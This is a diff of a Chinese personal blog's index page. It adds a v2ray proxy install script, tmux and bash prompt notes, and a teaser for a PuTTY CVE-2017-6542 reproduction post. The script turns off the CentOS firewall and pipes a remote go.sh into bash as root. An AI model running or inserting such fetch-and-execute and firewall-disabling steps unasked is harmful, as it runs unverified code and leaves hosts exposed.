+<h3 id="安装v2ray"><a href="#安装v2ray" class="headerlink" title="安装v2ray"></a>安装v2ray</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># Copyright (c) 2018 flyzy小站</span></span><br><span class="line"></span><br><span class="line">red=<span class="string">&#x27;\033[0;31m&#x27;</span></span><br><span class="line">green=<span class="string">&#x27;\033[0;32m&#x27;</span></span><br><span class="line">yellow=<span class="string">&#x27;\033[0;33m&#x27;</span></span><br><span class="line">plain=<span class="string">&#x27;\033[0m&#x27;</span></span><br><span class="line"></span><br><span class="line">os=<span class="string">&#x27;ossystem&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_os</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> [[ -f /etc/redhat-release ]]; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;debian&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;debian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;ubuntu&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;ubuntu&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /etc/issue | grep -Eqi <span class="string">&quot;centos|red hat|redhat&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;debian&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;debian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;ubuntu&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;ubuntu&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> cat /proc/version | grep -Eqi <span class="string">&quot;centos|red hat|redhat&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        os=<span class="string">&quot;centos&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">getversion</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [[ -s /etc/redhat-release ]]; <span class="keyword">then</span></span><br><span class="line">        grep -oE  <span class="string">&quot;[0-9.]+&quot;</span> /etc/redhat-release</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        grep -oE  <span class="string">&quot;[0-9.]+&quot;</span> /etc/issue</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">centosversion</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$&#123;os&#125;</span> == <span class="string">&#x27;centos&#x27;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">local</span> code=<span class="variable">$1</span></span><br><span class="line">        <span class="built_in">local</span> version=<span class="string">&quot;<span class="subst">$(getversion)</span>&quot;</span></span><br><span class="line">        <span class="built_in">local</span> main_ver=<span class="variable">$&#123;version%%.*&#125;</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$main_ver</span>&quot;</span> == <span class="string">&quot;<span class="variable">$code</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">firewall_set</span></span>() &#123;</span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 正在设置防火墙...&quot;</span></span><br><span class="line">	<span class="keyword">if</span> centosversion 6; <span class="keyword">then</span></span><br><span class="line">		/etc/init.d/iptables status &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">		<span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">			chkconfig iptables off</span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙已经关闭。&quot;</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;yellow&#125;</span>警告<span class="variable">$&#123;plain&#125;</span>] 防火墙（iptables）好像已经停止或没有安装，如有需要请手动关闭防火墙。&quot;</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">elif</span> centosversion 7; <span class="keyword">then</span></span><br><span class="line">		systemctl status firewalld &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">		<span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">			systemctl stop firewalld.service</span><br><span class="line">			systemctl <span class="built_in">disable</span> firewalld.service</span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙已经关闭。&quot;</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;yellow&#125;</span>警告<span class="variable">$&#123;plain&#125;</span>] 防火墙（iptables）好像已经停止或没有安装，如有需要请手动关闭防火墙。&quot;</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;green&#125;</span>信息<span class="variable">$&#123;plain&#125;</span>] 防火墙设置成功。&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">	check_os</span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$&#123;os&#125;</span> == <span class="string">&#x27;centos&#x27;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                firewall_set</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">	bash &lt;(curl -L -s https://install.direct/go.sh)	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> -e <span class="string">&quot;[<span class="variable">$&#123;red&#125;</span>错误<span class="variable">$&#123;plain&#125;</span>] 必需以root身份运行，请使用sudo命令&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">main</span><br></pre></td></tr></table></figure>
+
+<h3 id="改变终端前缀提示"><a href="#改变终端前缀提示" class="headerlink" title="改变终端前缀提示"></a>改变终端前缀提示</h3><p>在<code>~/.bashrc</code>文件中添加<code>export PROMPT_COMMAND=&#39;echo Hello,Spwpun&#39;</code>类似这样的语句，在终端前面就会显示提示信息。</p>
+<p><img src="/2020/06/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/image-20200920003523225.png" alt="image-20200920003523225"></p>
+<h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><p>tmux是一个终端复用器，开启的一个终端叫做一个session，可以开启多个终端来执行AFL的并行模式。</p>
+<p><code>tmux ls</code>: 查看已有会话。</p>
+<p><code>tmux new -s &lt;session-name&gt;</code>：新建会话。</p>
+<p><code>tmux attach -t &lt;session-name&gt;</code>：接入会话。</p>
+<p>tmux有大量快捷键，不过需要前缀键才能使用，默认的前缀键是<code>Ctrl+B</code>。</p>
+<p>前缀键：s（列出会话）、d（退出会话）、$（重命名当前会话）</p>
+
       
     </div>
 
@@ -1312,97 +1473,79 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-        
+      
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/18/putty-CVE-2017-6542复现/">
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://spwpun.github.io/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Demen Lee">
       <meta itemprop="description" content="Sharing, Communicating more, then moving on......">
-      <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Spwpun's Blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-            
-            <a href="/2020/06/18/putty-CVE-2017-6542复现/" class="post-title-link" itemprop="url">putty CVE-2017-6542复现</a>
+        <h2 class="post-title" itemprop="name headline">
           
-        </h1>
+            <a href="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">putty CVE-2017-6542复现</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
+                <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              
-                
-              
-
               <time title="Created: 2020-06-18 09:43:59" itemprop="dateCreated datePublished" datetime="2020-06-18T09:43:59+08:00">2020-06-18</time>
             </span>
-          
-            
-
-            
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
+                  <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
                 <time title="Modified: 2020-11-09 19:16:38" itemprop="dateModified" datetime="2020-11-09T19:16:38+08:00">2020-11-09</time>
               </span>
-            
-          
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
+                <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞挖掘/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a></span>
-
-                
-                
-              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
+                </span>
             </span>
-          
 
           
-            <span id="/2020/06/18/putty-CVE-2017-6542复现/" class="post-meta-item leancloud_visitors" data-flag-title="putty CVE-2017-6542复现" title="Views">
+            <span id="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/" class="post-meta-item leancloud_visitors" data-flag-title="putty CVE-2017-6542复现" title="Views">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">Views: </span>
               <span class="leancloud-visitors-count"></span>
             </span>
-          
   
   <span class="post-meta-item">
     
       <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
+        <i class="far fa-comment"></i>
       </span>
-        
-      
       <span class="post-meta-item-text">Valine: </span>
     
-    <a title="valine" href="/2020/06/18/putty-CVE-2017-6542复现/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/18/putty-CVE-2017-6542复现/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/" itemprop="commentCount"></span>
+    </a>
   </span>
   
   
@@ -1416,17 +1559,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>第一次分析这样的漏洞吧，尽可能写得详细一点。Putty是一个开源软件，通常用于Unix系统的SSH连接工具，其官方网站为：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html。之前在搭建自己的服务器的时候就使用过，不过因为不太稳定就换成xshell了。" target="_blank" rel="noopener">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html。之前在搭建自己的服务器的时候就使用过，不过因为不太稳定就换成xshell了。</a></p>
-          <!--noindex-->
-          
-            <div class="post-button">
-              <a class="btn" href="/2020/06/18/putty-CVE-2017-6542复现/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
+          <h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>第一次分析这样的漏洞吧，尽可能写得详细一点。Putty是一个开源软件，通常用于Unix系统的SSH连接工具，其官方网站为：<a target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html%E3%80%82%E4%B9%8B%E5%89%8D%E5%9C%A8%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%BD%BF%E7%94%A8%E8%BF%87%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E4%B8%8D%E5%A4%AA%E7%A8%B3%E5%AE%9A%E5%B0%B1%E6%8D%A2%E6%88%90xshell%E4%BA%86%E3%80%82">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html。之前在搭建自己的服务器的时候就使用过，不过因为不太稳定就换成xshell了。</a></p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>PuTTY 0.68之前的<code>ssh_agent_channel_data</code>函数中存在一个heap-corrupting integer overflow漏洞，使得攻击者可以通过构造特殊数据使得PuTTY崩溃或者远程代码执行。</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul>
+<li>PuTTY 0.67</li>
+<li>Linux 虚拟机，开启ssh服务，安装socat。</li>
+</ul>
+<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>开启PuTTY的ssh agent fowarding：</p>
+<p><img src="/2020/06/18/putty-CVE-2017-6542%E5%A4%8D%E7%8E%B0/image-20200714011006104.png" alt="image-20200714011006104"></p>
+<center>图1：Allow agent forwarding</center>
+
+
       
     </div>
 
@@ -1434,16 +1577,13 @@
     
     
       <footer class="post-footer">
-          <div class="post-eof"></div>
-        
+        <div class="post-eof"></div>
       </footer>
   </article>
   
   
   
 
-    
-  </div>
 
   
   <nav class="pagination">
@@ -1454,6 +1594,28 @@
 
           </div>
           
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
 
         </div>
           
@@ -1483,113 +1645,61 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image"
-      src="/images/avatar.gif"
-      alt="Demen Lee">
+    <img class="site-author-image" itemprop="image" alt="Demen Lee"
+      src="/images/avatar.gif">
   <p class="site-author-name" itemprop="name">Demen Lee</p>
   <div class="site-description" itemprop="description">Sharing, Communicating more, then moving on......</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-        
           <a href="/archives/">
         
           <span class="site-state-item-count">32</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-categories">
-        
-          
             <a href="/categories/">
           
-        
         <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">categories</span>
-        </a>
+        <span class="site-state-item-name">categories</span></a>
       </div>
-    
-      
-      
       <div class="site-state-item site-state-tags">
-        
-          
             <a href="/tags/">
           
-        
         <span class="site-state-item-count">33</span>
-        <span class="site-state-item-name">tags</span>
-        </a>
+        <span class="site-state-item-name">tags</span></a>
       </div>
-    
   </nav>
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/spwpun" title="GitHub &rarr; https://github.com/spwpun" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/spwpun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;spwpun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="mailto:spwpun@gmail.com" title="E-Mail &rarr; mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:spwpun@gmail.com" title="E-Mail → mailto:spwpun@gmail.com" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5536839794" title="Weibo &rarr; https://weibo.com/u/5536839794" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5536839794" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5536839794" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
       </span>
-    
       <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease &rarr; https://music.163.com/#/user/home?id=127070793" rel="noopener" target="_blank"><i class="fa fa-fw fa-netease"></i>Netease</a>
+        <a href="https://music.163.com/#/user/home?id=127070793" title="Netease → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;127070793" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Netease</a>
       </span>
-    
   </div>
 
 
   <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title">
-      <i class="fa fa-fw fa-link"></i>
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
       Links
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io" title="https://whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io" rel="noopener" target="_blank">Whale3070</a>
         </li>
-      
         <li class="links-of-blogroll-item">
-          <a href="https://eternalhikari.github.io" title="https://eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
+          <a href="https://eternalhikari.github.io/" title="https:&#x2F;&#x2F;eternalhikari.github.io" rel="noopener" target="_blank">Hikari</a>
         </li>
-      
     </ul>
   </div>
 
@@ -1603,17 +1713,23 @@
       </div>
     </main>
 
-    <footer id="footer" class="footer">
+    <footer class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-flag-checkered"></i>
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="flag-checkered"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Spwpun</span>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a></div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
 
         
 <div class="busuanzi-count">
@@ -1626,9 +1742,7 @@
         <span id="busuanzi_value_site_uv"></span>
       </span>
     </span>
-  
     <span class="post-meta-divider">|</span>
-  
     <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
       <span class="post-meta-item-icon">
         <i class="fa fa-eye"></i>
@@ -1637,7 +1751,6 @@
         <span id="busuanzi_value_site_pv"></span>
       </span>
     </span>
-  
 </div>
 
 
@@ -1647,51 +1760,47 @@
 
 
 
-
-
-
-
-        
       </div>
     </footer>
   </div>
 
   
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
-<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/js/next-boot.js?v=7.4.1"></script>
+<script src="/js/utils.js"></script>
 
-
-
-  
+<script src="/js/motion.js"></script>
 
 
+<script src="/js/schemes/pisces.js"></script>
 
 
-
-
-
-
-  <script src="/js/local-search.js?v=7.4.1"></script>
-
-
-
-
-
-
-
-
-
-
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
 
   
 
@@ -1699,29 +1808,31 @@
 
 
 <script>
-NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
-  var GUEST = ['nick', 'mail', 'link'];
-  var guest = 'nick,mail,link';
-  guest = guest.split(',').filter(item => {
-    return GUEST.includes(item);
-  });
-  new Valine({
-    el: '#comments',
-    verify: true,
-    notify: false,
-    appId: 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
-    appKey: 'qdSjFo9LUO20Ba6XRPMQGX7v',
-    placeholder: 'Leave something interesting......',
-    avatar: 'mm',
-    meta: guest,
-    pageSize: '10' || 10,
-    visitor: true,
-    lang: '' || 'zh-cn',
-    path: location.pathname,
-    recordIP: false,
-    serverURLs: ''
-  });
-}, window.Valine);
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : false,
+      appId      : 'O9n8UnYXJ5M4s4QEumwRCwH9-gzGzoHsz',
+      appKey     : 'qdSjFo9LUO20Ba6XRPMQGX7v',
+      placeholder: "Leave something interesting......",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
 </script>
 
 </body>
